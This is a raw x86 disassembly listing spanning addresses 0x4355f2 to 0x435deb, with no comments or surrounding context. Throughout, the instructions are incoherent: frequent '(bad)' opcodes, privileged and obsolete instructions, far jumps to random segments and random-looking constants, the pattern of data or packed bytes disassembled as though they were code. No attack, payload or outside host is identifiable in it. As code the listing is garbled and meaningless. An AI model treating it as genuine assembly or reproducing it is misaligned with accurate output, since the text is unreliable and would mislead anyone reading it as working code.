  4355f2:	je     0x435653
  4355f4:	sbb    ebx,DWORD PTR [ebx+0x341725de]
  4355fa:	push   edi
  4355fb:	pop    edx
  4355fc:	mov    bp,gs
  4355ff:	mov    esi,0xbf079248
  435605:	sub    ecx,edi
  435607:	int3   
  435608:	add    edi,DWORD PTR [eax+0xb]
  43560b:	imul   edx,DWORD PTR [ecx+0x3a9fe51e],0x2f05cae8
  435615:	ret    
  435616:	test   WORD PTR [ebp+0x8948755],dx
  43561d:	and    eax,0x38111c5
  435622:	into   
  435623:	push   esp
  435624:	(bad)  
  435625:	retf   
  435626:	sar    BYTE PTR [bx],cl
  435629:	xor    esp,ebx
  43562b:	aas    
  43562c:	adc    al,0x62
  43562e:	sbb    BYTE PTR [esi+eax*8-0x5e46d341],ch
  435635:	loop   0x4355c9
  435637:	pop    ebp
  435638:	pop    ecx
  435639:	das    
  43563a:	fwait
  43563b:	aam    0x63
  43563d:	(bad)  
  43563e:	and    eax,0x50dff956
  435643:	mov    esi,0xba737f20
  435648:	sar    DWORD PTR [edi+0x2c],cl
  43564b:	sahf   
  43564c:	pop    esp
  43564d:	cmp    ah,BYTE PTR [ebx]
  43564f:	repz mov al,0xe7
  435652:	mov    esi,0x7848e94f
  435657:	fwait
  435658:	pushf  
  435659:	aam    0xed
  43565b:	add    BYTE PTR ss:[ebx+0x666f5961],ah
  435662:	ror    BYTE PTR [edx],cl
  435664:	push   ebp
  435665:	lds    ebp,FWORD PTR [ebx]
  435667:	(bad)  
  435668:	outs   dx,DWORD PTR ds:[esi]
  435669:	push   esp
  43566a:	jo     0x4356b2
  43566c:	cdq    
  43566d:	icebp  
  43566e:	aas    
  43566f:	fs popf 
  435671:	inc    ecx
  435672:	ret    0x4d2b
  435675:	and    eax,0xdb0075c5
  43567a:	pop    ebp
  43567b:	jb     0x4356a8
  43567d:	sub    al,0xb3
  43567f:	mov    esi,0xd2ea6ca0
  435684:	mov    eax,0x43bf2110
  435689:	retw   0x207b
  43568d:	jne    0x4356ed
  43568f:	push   0x46
  435691:	xor    ah,bl
  435693:	lahf   
  435694:	xchg   ebx,eax
  435695:	sbb    DWORD PTR [ecx-0x76],edx
  435698:	je     0x4356b5
  43569a:	aaa    
  43569b:	jnp    0x43569e
  43569d:	lds    edi,FWORD PTR [ebx+0x15]
  4356a0:	test   BYTE PTR [edx-0x33],bh
  4356a3:	leave  
  4356a4:	xchg   ebp,eax
  4356a5:	pop    ss
  4356a6:	bsr    ebx,DWORD PTR [eax+0x3de3ad6d]
  4356ad:	xchg   ecx,eax
  4356ae:	cmc    
  4356af:	or     cl,BYTE PTR [ebx]
  4356b1:	sub    ecx,DWORD PTR ds:0xcb956954
  4356b7:	pop    ss
  4356b8:	jp     0x435698
  4356ba:	scas   al,BYTE PTR es:[edi]
  4356bb:	ds cld 
  4356bd:	jge    0x435644
  4356bf:	add    ecx,ecx
  4356c1:	pextrw esp,(bad),0xc5
  4356c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4356c4:	jbe    0x4356a9
  4356c6:	push   eax
  4356c7:	adc    al,0x9d
  4356c9:	(bad)
  4356cc:	out    dx,al
  4356cd:	jle    0x43570a
  4356cf:	pop    ds
  4356d0:	call   0xed817946
  4356d5:	mov    dl,dl
  4356d7:	add    eax,0x90135643
  4356dc:	or     ebx,ebp
  4356de:	mov    edi,0xc2843cc2
  4356e3:	mov    ch,0xee
  4356e5:	cmc    
  4356e6:	(bad)  
  4356e8:	mov    dl,0x71
  4356ea:	push   ecx
  4356eb:	and    BYTE PTR [edx+0x382299d3],bl
  4356f1:	pop    esp
  4356f2:	cmp    ch,dh
  4356f4:	and    eax,DWORD PTR [edx-0x1d57b7ad]
  4356fa:	bound  ebp,QWORD PTR [ecx+edx*1+0x25963ef]
  435701:	repz fld st(4)
  435704:	adc    DWORD PTR [ebx-0xf],eax
  435707:	mov    ecx,0x2ed82755
  43570c:	call   0xfb274420
  435711:	popa   
  435712:	xchg   BYTE PTR [ebx+0x78],cl
  435715:	je     0x43575f
  435717:	add    ah,ah
  435719:	jmp    0xe919:0x5dfe1910
  435720:	enter  0x59eb,0xa0
  435724:	or     eax,0xcec2c39e
  435729:	shr    DWORD PTR [ecx],0xcb
  43572c:	mov    al,ds:0xb07f5ee7
  435731:	and    eax,0xe849756
  435736:	inc    esp
  435737:	push   ecx
  435738:	inc    esi
  435739:	push   edi
  43573a:	mov    ch,0xb3
  43573c:	push   ebp
  43573d:	cwde   
  43573e:	or     al,0x22
  435740:	pop    ebx
  435741:	lock jo 0x43577c
  435744:	scas   al,BYTE PTR es:[edi]
  435745:	outs   dx,BYTE PTR ds:[esi]
  435746:	cld    
  435747:	fldcw  WORD PTR ds:0xa4eb1b72
  43574d:	cdq    
  43574e:	(bad)  
  43574f:	xor    al,BYTE PTR [ebx+0x5161b26b]
  435755:	or     ebx,0xffffffbb
  435758:	(bad)  
  435759:	aad    0x6f
  43575b:	inc    esp
  43575c:	dec    eax
  43575d:	cmp    BYTE PTR [ebx],ah
  43575f:	lahf   
  435760:	lods   al,BYTE PTR ds:[esi]
  435761:	inc    ebp
  435762:	shl    DWORD PTR [ecx+esi*4+0x3],0xae
  435767:	pusha  
  435768:	mov    edx,0xa261d5c9
  43576d:	cmp    al,0x92
  43576f:	test   DWORD PTR [ebx+0x3114c0f],esi
  435775:	sahf   
  435776:	cmp    BYTE PTR [edi+0x45],bh
  435779:	mov    esp,0x14f934d2
  43577e:	rol    DWORD PTR [esi+0x7d],cl
  435781:	shr    DWORD PTR [eax-0x4f],0x53
  435785:	out    dx,al
  435786:	mov    ds:0x59dab6f4,eax
  43578b:	push   esi
  43578c:	(bad)  
  43578d:	mov    esp,0x1b0f1e43
  435792:	stos   BYTE PTR es:[edi],al
  435793:	mov    esi,0x1b2921c2
  435798:	clc    
  435799:	jge    0x43578b
  43579b:	(bad)
  43579e:	and    al,0x7e
  4357a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4357a1:	mov    esp,0x71a6eabb
  4357a6:	sar    DWORD PTR [ebx+0x15],1
  4357a9:	xchg   ebx,eax
  4357aa:	lock mov BYTE PTR [edx],ah
  4357ad:	ds pop es
  4357af:	push   es
  4357b0:	(bad)  
  4357b1:	push   ecx
  4357b2:	mov    dl,0x65
  4357b4:	mov    edx,DWORD PTR [esp+edi*2+0x22]
  4357b8:	popf   
  4357b9:	cmp    al,BYTE PTR [ebx]
  4357bb:	xchg   edi,eax
  4357bc:	arpl   WORD PTR [ecx+0x4a],si
  4357bf:	dec    esp
  4357c0:	fmul   DWORD PTR [edi+eiz*8+0x1ad9861c]
  4357c7:	push   ds
  4357c8:	cmp    BYTE PTR [ebx+0x5b],cl
  4357cb:	sub    eax,0x3e977035
  4357d0:	ret    
  4357d1:	jge    0x435801
  4357d3:	and    al,BYTE PTR [ecx]
  4357d5:	lock jp 0x4357a4
  4357d8:	inc    esp
  4357d9:	sub    edi,DWORD PTR [esi-0x19d61b08]
  4357df:	daa    
  4357e0:	mov    DWORD PTR [ebp+0x36346263],edi
  4357e6:	inc    ebx
  4357e7:	add    BYTE PTR [esi+ebp*4-0x206c9bda],ch
  4357ee:	ret    0x8a4e
  4357f1:	out    dx,al
  4357f2:	ret    
  4357f3:	aas    
  4357f4:	les    ecx,FWORD PTR [esi+0x7c3464b0]
  4357fa:	xchg   edi,eax
  4357fb:	data16 mov dh,BYTE PTR [ecx]
  4357fe:	rcl    BYTE PTR [edi+0x7e],1
  435801:	outs   dx,DWORD PTR ds:[esi]
  435802:	pushf  
  435803:	(bad)  
  435804:	fldcw  WORD PTR [edx]
  435806:	fmul   st(0),st
  435808:	xlat   BYTE PTR ds:[ebx]
  435809:	mov    ss,WORD PTR [eax+0x16]
  43580c:	cmp    bl,bl
  43580e:	pop    edi
  43580f:	push   eax
  435810:	mov    esi,0x3d3a3b92
  435815:	or     eax,0xc1d21fa7
  43581a:	shl    DWORD PTR [esi+0x7e],1
  43581d:	push   cs
  43581e:	retf   0x54a7
  435821:	dec    ebx
  435822:	push   ds
  435823:	push   0x9d664e77
  435828:	shl    edx,cl
  43582a:	jle    0x4357ea
  43582c:	aaa    
  43582d:	imul   eax,ebp,0x1b40342f
  435833:	push   edx
  435834:	mov    fs,WORD PTR [ebp-0x4195648b]
  43583a:	por    mm0,QWORD PTR [ebp-0x524356e6]
  435841:	sub    BYTE PTR [ebx+0x2cb370b],dl
  435847:	(bad)  
  435849:	jns    0x43589b
  43584b:	int3   
  43584c:	mov    eax,0x9ad23935
  435851:	cmc    
  435852:	idiv   edx
  435854:	adc    eax,0x2cf2ff0c
  435859:	cmp    al,BYTE PTR [ebp+0x38e8a6a1]
  43585f:	inc    edi
  435860:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435861:	pop    esp
  435862:	ret    
  435863:	lahf   
  435864:	ss mov ebx,0x6fc631ee
  43586a:	fist   DWORD PTR [edx+0x33]
  43586d:	push   edi
  43586e:	in     al,dx
  43586f:	and    cl,BYTE PTR ds:0x81f1e17c
  435875:	inc    edi
  435877:	icebp  
  435878:	mov    ecx,0x939827bb
  43587d:	dec    DWORD PTR [edx-0x1d59fa18]
  435883:	bound  esp,QWORD PTR [eax]
  435885:	or     esp,DWORD PTR [esi+eiz*8+0x61]
  435889:	scas   eax,DWORD PTR es:[edi]
  43588a:	push   0xffffffb6
  43588c:	or     edi,esp
  43588e:	mov    ecx,0x3a1a2023
  435893:	js     0x4358fa
  435895:	mov    ds:0x13ec53ad,al
  43589a:	push   esi
  43589b:	mov    ebp,0xead55bd
  4358a0:	pop    eax
  4358a1:	pop    eax
  4358a2:	jmp    0xf993:0x580ce9a8
  4358a9:	retf   
  4358aa:	dec    ecx
  4358ab:	outs   dx,DWORD PTR ds:[esi]
  4358ac:	sbb    al,0xcb
  4358ae:	leave  
  4358af:	daa    
  4358b0:	imul   edi,eax,0x6b
  4358b3:	jmp    0x919:0x7397a201
  4358ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4358bb:	xchg   ebp,ebp
  4358bd:	push   ds
  4358be:	ss fs push ebx
  4358c1:	pop    es
  4358c2:	xor    eax,0x22805746
  4358c7:	mov    dh,0xdc
  4358c9:	pop    ss
  4358ca:	sub    ebx,edx
  4358cc:	fbld   TBYTE PTR [esi-0x49c244db]
  4358d2:	leave  
  4358d3:	pop    ebp
  4358d4:	popa   
  4358d5:	fnstenv [edx+0x21]
  4358d8:	ror    DWORD PTR [edi+0x249c245b],1
  4358de:	enter  0x87a0,0x5
  4358e2:	aaa    
  4358e3:	pop    edx
  4358e4:	inc    esi
  4358e5:	int3   
  4358e6:	fimul  DWORD PTR [esp+ebp*4]
  4358e9:	dec    eax
  4358ea:	adc    DWORD PTR [edx+ebp*8+0x3f],0x871d6b01
  4358f2:	aad    0x12
  4358f4:	call   0x739d3a84
  4358f9:	shl    edi,cl
  4358fb:	dec    edi
  4358fc:	push   ecx
  4358fd:	pop    ebx
  4358fe:	mov    WORD PTR [ecx-0x2bab94fb],gs
  435904:	or     dl,BYTE PTR [eax-0x68]
  435907:	mov    ch,0x4c
  435909:	mov    esp,0xa06b5d72
  43590e:	stos   DWORD PTR es:[edi],eax
  43590f:	inc    ebx
  435910:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435911:	mov    ebp,DWORD PTR [eax+0x57177f3]
  435917:	test   ah,ch
  435919:	shr    DWORD PTR [edi-0x5d],1
  43591c:	mov    edx,0x9454b179
  435921:	jl     0x4358ce
  435923:	mov    ecx,0x23361291
  435928:	pop    es
  435929:	jp     0x435927
  43592b:	xor    ebx,DWORD PTR [edx+edx*2-0x47]
  43592f:	stc    
  435930:	inc    edi
  435931:	sbb    DWORD PTR [eax],ebp
  435933:	xchg   edx,eax
  435934:	sbb    BYTE PTR [edx],dh
  435936:	jecxz  0x4359a1
  435938:	sub    DWORD PTR [edi],0xffffff99
  43593b:	into   
  43593c:	mov    ecx,0xeb0067a5
  435941:	outs   dx,DWORD PTR ds:[esi]
  435942:	repnz scas al,BYTE PTR es:[edi]
  435944:	pop    ss
  435945:	sbb    ah,BYTE PTR [edi-0x5d]
  435948:	jl     0x43598d
  43594a:	push   0xcb65d0aa
  43594f:	dec    eax
  435950:	sbb    eax,0x7708a311
  435955:	or     al,0x7
  435957:	js     0x43592f
  435959:	pusha  
  43595a:	sbb    al,0x68
  43595c:	xchg   BYTE PTR [edi+0x60],dl
  43595f:	mov    DWORD PTR [edx+0x42f9aa30],edx
  435965:	lds    edx,FWORD PTR [ebp+0x5d]
  435968:	xchg   ebp,eax
  435969:	dec    eax
  43596a:	leave  
  43596b:	jne    0x43599c
  43596d:	mov    dh,0x17
  43596f:	div    DWORD PTR [esi+0x54bd9c6d]
  435975:	dec    ebp
  435976:	mov    ebp,0xcbdadabe
  43597b:	lahf   
  43597c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43597d:	fsubr  st,st(4)
  43597f:	call   0x7ac89152
  435984:	ins    BYTE PTR es:[edi],dx
  435985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435986:	cmp    edx,ecx
  435988:	fs push 0x55
  43598b:	outs   dx,BYTE PTR ds:[esi]
  43598c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43598d:	push   esi
  43598e:	xor    al,BYTE PTR [edi-0x25233de]
  435994:	stc    
  435995:	and    BYTE PTR [edx+edi*4],cl
  435998:	xchg   DWORD PTR [edi-0x2d15deed],ebp
  43599e:	imul   esp,DWORD PTR [edi+0x26],0xffffffb1
  4359a2:	stos   BYTE PTR es:[edi],al
  4359a3:	sar    BYTE PTR [ecx],1
  4359a5:	pusha  
  4359a6:	add    al,0x59
  4359a8:	cmp    eax,0x870a743e
  4359ad:	out    0x46,al
  4359af:	xchg   ecx,eax
  4359b0:	das    
  4359b1:	outs   dx,DWORD PTR ds:[esi]
  4359b2:	std    
  4359b3:	mov    ebx,0xe56da16d
  4359b8:	mov    esi,0x72a59cb7
  4359bd:	pop    ebp
  4359be:	inc    esp
  4359bf:	xor    eax,0x93cdd9e4
  4359c4:	xor    cl,dl
  4359c6:	or     al,0x2
  4359c8:	cmp    BYTE PTR [ebx-0x55],0xcf
  4359cc:	mov    ebx,0x3a120278
  4359d1:	cmp    al,0x20
  4359d3:	cwde   
  4359d4:	mov    eax,ds:0xa26c3dfb
  4359d9:	xchg   esp,eax
  4359da:	scas   eax,DWORD PTR es:[edi]
  4359db:	push   0xffffffe3
  4359dd:	jle    0x4359aa
  4359df:	push   eax
  4359e0:	imul   esi,DWORD PTR [eax],0x62
  4359e3:	loope  0x4359fc
  4359e5:	sbb    dl,bh
  4359e7:	jo     0x435a17
  4359e9:	or     esi,DWORD PTR [ebx+0x78]
  4359ec:	adc    al,0xfc
  4359ee:	ins    DWORD PTR es:[edi],dx
  4359ef:	jmp    0x88ff:0xdb1b49d0
  4359f6:	mov    dh,dl
  4359f8:	(bad)  
  4359f9:	mov    esp,?
  4359fb:	mov    DWORD PTR [ebp+0x29],esi
  4359fe:	push   es
  4359ff:	pop    es
  435a00:	sar    BYTE PTR [ebx-0x34104a5],1
  435a06:	loopne 0x435a5d
  435a08:	bound  edx,QWORD PTR [ebp-0x4f]
  435a0b:	test   eax,0x36f9708
  435a10:	push   ebx
  435a11:	mov    eax,ds:0x469c99da
  435a16:	jae    0x4359f1
  435a18:	jmp    0xcf08:0x978551a7
  435a1f:	pop    eax
  435a20:	(bad)  
  435a21:	pop    ss
  435a22:	adc    DWORD PTR [edx+0x2892cbfe],0x7240914f
  435a2c:	cmp    BYTE PTR [esi-0x51872599],ah
  435a32:	cmp    BYTE PTR [edx],ch
  435a34:	pop    es
  435a35:	mov    bh,0xea
  435a37:	icebp  
  435a38:	std    
  435a39:	and    DWORD PTR [esi-0x61],esi
  435a3c:	in     al,0x2c
  435a3e:	(bad)  
  435a3f:	ds stc 
  435a41:	pop    esi
  435a42:	ret    0xe137
  435a45:	and    ecx,DWORD PTR [ebp+0x1c45751d]
  435a4b:	jl     0x435a28
  435a4d:	ret    0xf074
  435a50:	push   0x71171c1
  435a55:	hlt    
  435a56:	mov    ch,0x65
  435a58:	add    eax,0x290b4540
  435a5d:	stc    
  435a5e:	(bad)  
  435a5f:	jns    0x435a9d
  435a61:	mov    ch,0xa7
  435a63:	arpl   WORD PTR [eax],si
  435a65:	xchg   DWORD PTR [edi],ebx
  435a67:	add    DWORD PTR [esi-0x76],edx
  435a6a:	bound  edi,QWORD PTR [edx]
  435a6c:	sbb    esp,DWORD PTR [ecx+0x3dbc656a]
  435a72:	mul    BYTE PTR [ebx+edi*2]
  435a75:	test   DWORD PTR [edx],0x6e67acef
  435a7b:	cdq    
  435a7c:	gs popf 
  435a7e:	aam    0xe1
  435a80:	retf   
  435a81:	scas   al,BYTE PTR es:[edi]
  435a82:	call   0xf6e6:0x750388b1
  435a89:	and    DWORD PTR [ebp+0x33cc5e93],esp
  435a8f:	in     al,0x8d
  435a91:	xor    al,0x84
  435a93:	sbb    ch,BYTE PTR [edi+0xd15d302]
  435a99:	mov    eax,0x193e30be
  435a9e:	in     eax,dx
  435a9f:	int    0x7d
  435aa1:	add    eax,0xb9276931
  435aa6:	mov    al,ds:0x909bea97
  435aab:	test   al,0x72
  435aad:	pusha  
  435aae:	jbe    0x435a3d
  435ab0:	(bad)  
  435ab1:	aad    0x75
  435ab3:	mov    BYTE PTR [edi+0x28fb1431],ah
  435ab9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435aba:	adc    BYTE PTR [eax+0x1a0a76ca],0x78
  435ac1:	sbb    DWORD PTR [edx+0x114ad5a4],ebx
  435ac7:	mov    ds:0xea02b84e,al
  435acc:	imul   ebp,edi,0xffffffd1
  435acf:	das    
  435ad0:	repz test eax,0x2db3eddc
  435ad6:	pop    eax
  435ad7:	cdq    
  435ad8:	clc    
  435ad9:	pushf  
  435ada:	aad    0xb6
  435adc:	popf   
  435add:	and    al,0xd5
  435adf:	sub    eax,0x8248bfdb
  435ae4:	mov    bh,0x36
  435ae6:	mov    ds:0x1e13488a,al
  435aeb:	inc    ecx
  435aec:	sti    
  435aed:	dec    edi
  435aee:	mov    eax,ds:0x8438736e
  435af3:	jp     0x435ae4
  435af5:	and    ch,BYTE PTR [ebp-0x48bc2931]
  435afb:	(bad)  
  435afc:	dec    esp
  435afd:	sbb    al,0x38
  435aff:	inc    edi
  435b00:	les    edi,FWORD PTR [ecx-0x52]
  435b03:	push   eax
  435b04:	mov    bh,0x9b
  435b06:	mov    bh,0xc5
  435b08:	dec    di
  435b0a:	pop    ebx
  435b0b:	fistp  QWORD PTR [eax-0x5bf62ef5]
  435b11:	sahf   
  435b12:	lahf   
  435b13:	pop    esp
  435b14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435b15:	enter  0x3d11,0x77
  435b19:	pop    esi
  435b1a:	cmp    al,0x6f
  435b1c:	icebp  
  435b1d:	xor    esi,DWORD PTR [edx]
  435b1f:	mov    ds:0x626912d2,al
  435b24:	loop   0x435adf
  435b26:	jbe    0x435b96
  435b28:	sbb    eax,0xe87c6fe7
  435b2d:	(bad)  
  435b2e:	push   ebx
  435b2f:	into   
  435b30:	frstpm(287 only) 
  435b32:	call   0x1ee8faa6
  435b37:	dec    esi
  435b38:	arpl   dx,sp
  435b3a:	dec    edx
  435b3b:	scas   eax,DWORD PTR es:[edi]
  435b3c:	daa    
  435b3d:	cmc    
  435b3e:	mov    al,0x59
  435b40:	or     esp,DWORD PTR [ecx-0x4019f2f4]
  435b46:	mov    ecx,0xa9b10b9b
  435b4b:	cmp    BYTE PTR [eax+0x4],0x5a
  435b4f:	test   al,0xbb
  435b51:	bts    DWORD PTR [edx-0x2],ecx
  435b55:	je     0x435ae5
  435b57:	cmp    bl,BYTE PTR ds:[ebx]
  435b5a:	ficomp DWORD PTR [ebx-0x7c6b9859]
  435b60:	xchg   edi,eax
  435b61:	out    dx,eax
  435b62:	in     al,dx
  435b63:	je     0x435bb1
  435b65:	retf   
  435b66:	inc    edx
  435b67:	lock xor DWORD PTR [ecx+ebx*1+0x73],eax
  435b6c:	or     ecx,DWORD PTR [edi-0x248b1342]
  435b72:	call   0x4edd2b80
  435b77:	test   al,0xee
  435b79:	repz and al,0xcd
  435b7c:	mov    ecx,0x7d3247d5
  435b81:	(bad)  
  435b83:	add    BYTE PTR [esi],0x3d
  435b86:	mov    eax,0x35a4d178
  435b8b:	mov    DWORD PTR [eax+0x7d],0x2505fc0a
  435b92:	push   edi
  435b93:	in     al,dx
  435b94:	loopne 0x435be7
  435b96:	mov    al,0xa4
  435b98:	int    0xa1
  435b9a:	sbb    dh,bh
  435b9c:	mov    edi,0xe1d0cbd3
  435ba1:	(bad)  
  435ba2:	mov    cl,0x6e
  435ba4:	xchg   esp,eax
  435ba5:	dec    esi
  435ba6:	inc    ebx
  435ba7:	add    al,0x96
  435ba9:	jg     0x435b39
  435bab:	xor    BYTE PTR [eax+eax*2+0x696c960c],ah
  435bb2:	jae    0x435c1e
  435bb4:	push   edx
  435bb5:	inc    ebp
  435bb6:	mov    esp,0xf732575e
  435bbb:	ror    ch,cl
  435bbd:	sbb    edx,DWORD PTR [ebx+0x21d8cba4]
  435bc3:	imul   ebx,DWORD PTR [esi+0x79],0x7c
  435bc7:	mov    bh,0xed
  435bc9:	jnp    0x435b63
  435bcb:	sbb    ah,BYTE PTR [ebp-0x5f]
  435bce:	stc    
  435bcf:	and    al,0x25
  435bd1:	in     al,dx
  435bd2:	mov    WORD PTR [edx],ds
  435bd4:	adc    esi,0xfb70702d
  435bda:	ficomp DWORD PTR [esi-0x4dbbcc8b]
  435be0:	icebp  
  435be1:	cld    
  435be2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435be3:	xchg   BYTE PTR [edx-0x2],dh
  435be6:	fld    QWORD PTR [ecx-0x65]
  435be9:	out    dx,al
  435bea:	gs leave 
  435bec:	and    ah,BYTE PTR ss:[edx-0x6a]
  435bf0:	mov    ecx,0xfa7b185a
  435bf5:	enter  0xbf30,0x35
  435bf9:	inc    ecx
  435bfa:	cmc    
  435bfb:	dec    edx
  435bfc:	cs loope 0x435bd6
  435bff:	mov    ebx,0x6c4b2aff
  435c04:	jmp    0xf9b4:0xf99a5e5
  435c0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435c0c:	add    esp,esp
  435c0e:	jns    0x435c86
  435c10:	xor    DWORD PTR [eax],eax
  435c12:	clc    
  435c13:	xor    ah,BYTE PTR [edi+0x48db9ce6]
  435c19:	test   eax,0xf9e8c4d7
  435c1e:	mov    eax,ds:0xf8ede68e
  435c23:	add    DWORD PTR [edi+0xf],esi
  435c26:	or     DWORD PTR [esi],edi
  435c28:	lods   eax,DWORD PTR ds:[esi]
  435c29:	xor    eax,0x2e241138
  435c2e:	in     al,0x10
  435c30:	fcomp  QWORD PTR [edi+0x2673b023]
  435c36:	loop   0x435c6e
  435c38:	mov    eax,ds:0x7d499b6
  435c3d:	add    dh,BYTE PTR [ebp+0x2b]
  435c40:	aaa    
  435c41:	push   0x30d1eefa
  435c46:	or     dl,bl
  435c48:	xor    eax,0x5c0f8aff
  435c4d:	mov    WORD PTR [ebp-0x46e9b4b],?
  435c53:	pop    ds
  435c54:	lds    eax,FWORD PTR [edx+edx*2+0x1381dcf1]
  435c5b:	in     al,dx
  435c5c:	fs pushf 
  435c5e:	push   0xffffff9e
  435c60:	fs popf 
  435c62:	lods   al,BYTE PTR ds:[esi]
  435c63:	fsubr  DWORD PTR [ecx+0x64edf581]
  435c69:	mov    edi,0xdd4d1a36
  435c6e:	inc    edx
  435c6f:	aaa    
  435c70:	adc    esi,esi
  435c72:	mov    edi,0xa9a075f6
  435c77:	mov    cl,0xa3
  435c79:	jl     0x435c81
  435c7b:	in     al,dx
  435c7c:	pop    es
  435c7d:	addr16 cmc 
  435c7f:	loop   0x435c05
  435c81:	shr    ecx,cl
  435c83:	sub    BYTE PTR [ebx],0x89
  435c86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435c87:	sti    
  435c88:	add    DWORD PTR ds:0x9572e6b3,esp
  435c8e:	test   al,0x89
  435c90:	(bad)  
  435c91:	sub    al,0x74
  435c93:	aad    0xa2
  435c95:	js     0x435c8e
  435c97:	or     BYTE PTR [ecx-0x55],bl
  435c9a:	and    BYTE PTR [edx-0x752b4dfb],al
  435ca0:	jae    0x435c40
  435ca2:	cdq    
  435ca3:	dec    ebp
  435ca4:	mov    eax,ds:0x8348c587
  435ca9:	add    BYTE PTR [edx-0x621bcb1b],al
  435caf:	jmp    FWORD PTR [edi-0x2e]
  435cb2:	je     0x435c39
  435cb4:	das    
  435cb5:	xchg   ebx,eax
  435cb6:	fpatan 
  435cb8:	xor    al,0xe2
  435cba:	push   edx
  435cbb:	add    BYTE PTR [edx+0x32],bl
  435cbe:	pop    ss
  435cbf:	jl     0x435ca2
  435cc1:	loop   0x435d17
  435cc3:	clc    
  435cc4:	mov    edi,0xee61e95e
  435cc9:	aaa    
  435cca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435ccb:	fnstcw WORD PTR [edi+0x49a1c22f]
  435cd1:	push   eax
  435cd2:	stos   DWORD PTR es:[edi],eax
  435cd3:	test   esp,ebp
  435cd5:	fwait
  435cd6:	int3   
  435cd7:	in     eax,dx
  435cd8:	ss add al,0x62
  435cdb:	pop    esi
  435cdc:	cmp    DWORD PTR [ecx],0xa984ab8f
  435ce2:	pop    ss
  435ce3:	lods   eax,DWORD PTR ds:[esi]
  435ce4:	add    dl,BYTE PTR [ebp+0x54]
  435ce7:	xor    dl,0xac
  435cea:	xlat   BYTE PTR ds:[ebx]
  435ceb:	jle    0x435c76
  435ced:	mov    dh,BYTE PTR [ebp+0x71]
  435cf0:	jbe    0x435c9a
  435cf2:	cmp    dh,bh
  435cf4:	sbb    al,0x2b
  435cf6:	(bad)  
  435cf7:	sbb    DWORD PTR [ebx+0x75573628],ebx
  435cfd:	xor    cl,BYTE PTR [edx-0x12]
  435d00:	xchg   ebp,eax
  435d01:	mov    BYTE PTR [esi-0x3d],0xd4
  435d05:	xchg   DWORD PTR [esi-0x68],esp
  435d08:	addr16 into 
  435d0a:	xor    bl,BYTE PTR [ecx+0x6e]
  435d0d:	sahf   
  435d0e:	in     al,0x19
  435d10:	sbb    dl,BYTE PTR [edx+0x6856b5d3]
  435d16:	clc    
  435d17:	aas    
  435d18:	pop    edx
  435d19:	fld    DWORD PTR [ebp+0x32]
  435d1c:	lahf   
  435d1d:	adc    DWORD PTR [ebx-0x2c],0x52
  435d21:	adc    al,0x41
  435d23:	les    edi,FWORD PTR [esi]
  435d25:	aad    0xcb
  435d27:	addr16 jp 0x435cd2
  435d2a:	push   edi
  435d2b:	sti    
  435d2c:	into   
  435d2d:	cmp    ch,dl
  435d2f:	sub    ebx,DWORD PTR [ecx-0x24a4fd5c]
  435d35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435d36:	xor    esi,0xffffffbd
  435d39:	cwde   
  435d3a:	jbe    0x435d6e
  435d3c:	pop    es
  435d3d:	cmp    al,0x7b
  435d3f:	retf   0x7b45
  435d42:	stc    
  435d43:	and    al,0x4b
  435d45:	popf   
  435d46:	sub    esp,DWORD PTR [eax+edx*8+0x2d123bf8]
  435d4d:	pop    esi
  435d4e:	iret   
  435d4f:	imul   esp,DWORD PTR [eax-0xf],0xeff245e2
  435d56:	cmp    edi,DWORD PTR [ebp+0x5793cfae]
  435d5c:	xor    eax,0x3b520591
  435d61:	adc    esp,DWORD PTR [ecx+0x67332366]
  435d67:	xchg   ebp,eax
  435d68:	call   0x91b2db58
  435d6d:	(bad)  
  435d6e:	loopne 0x435d10
  435d70:	add    DWORD PTR [ebp+0x77],0xf41cf1b8
  435d77:	sbb    BYTE PTR [edx-0x2acde199],al
  435d7d:	cs push es
  435d7f:	ret    
  435d80:	add    ebp,DWORD PTR [ebx-0x2d9d2563]
  435d86:	ins    BYTE PTR es:[edi],dx
  435d87:	adc    ebx,DWORD PTR [edx-0x13]
  435d8a:	cmp    eax,0x639a056d
  435d8f:	test   BYTE PTR [edi+eax*1],bl
  435d92:	xchg   ecx,eax
  435d93:	jnp    0x435e0d
  435d95:	push   cs
  435d96:	sub    DWORD PTR [esi+0x13],esp
  435d99:	adc    eax,0xcc9b4438
  435d9e:	inc    ebx
  435d9f:	xchg   ebx,eax
  435da0:	or     eax,0x54c0fbc1
  435da5:	jns    0x435dba
  435da7:	adc    al,0xe9
  435da9:	punpckhbw mm0,QWORD PTR [esi+0x2a68ad94]
  435db0:	outs   dx,DWORD PTR ds:[esi]
  435db1:	leave  
  435db2:	mov    bh,0xa2
  435db4:	mov    cl,0xbc
  435db6:	and    esi,ebp
  435db8:	pop    esi
  435db9:	(bad)  [ebx]
  435dbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435dbc:	inc    ebx
  435dbd:	aam    0x7
  435dbf:	jns    0x435df4
  435dc1:	xor    edx,DWORD PTR [esi]
  435dc3:	and    edx,edx
  435dc5:	test   DWORD PTR [ebx],edi
  435dc7:	out    0xc0,al
  435dc9:	sahf   
  435dca:	adc    BYTE PTR [ecx-0x1cdfcca2],dl
  435dd0:	pop    edi
  435dd1:	into   
  435dd2:	dec    DWORD PTR [edi-0x3b]
  435dd5:	addr16 inc ecx
  435dd7:	jg     0x435d92
  435dd9:	jbe    0x435e0f
  435ddb:	pop    ss
  435ddc:	(bad)  
  435ddd:	dec    edx
  435dde:	adc    BYTE PTR [ebp-0x54061b49],ah
  435de4:	sub    ch,BYTE PTR [eax]
  435de6:	sbb    eax,0x282eb415
  435deb:	out    dx,al
